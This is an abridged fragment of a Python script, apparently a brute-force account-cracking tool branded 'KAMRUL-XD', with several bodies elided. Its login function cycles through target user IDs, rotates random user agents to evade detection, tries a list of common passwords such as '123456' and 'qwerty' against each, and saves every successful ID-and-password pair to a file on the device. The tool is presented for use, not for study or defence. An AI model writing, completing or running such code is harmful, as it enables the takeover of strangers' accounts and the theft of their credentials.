...
#----------------------------[AUTO OPEN LINKS]----------------------------#
# Open YouTube, Whatsapp, WhatsApp
...
def KAMRUL_all():
    ...
    """
    return random.choice([KAMRUL_1(), KAMRUL_2(), KAMRUL_3()])
...
def login(uid, tl):
    ...
    try:
        ua_list = KAMRUL_all()
        sys.stdout.write(f"\r➤ {g}KAMRUL{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
            chosen_ua = KAMRUL_all()
            headers = {
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/KAMRUL-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
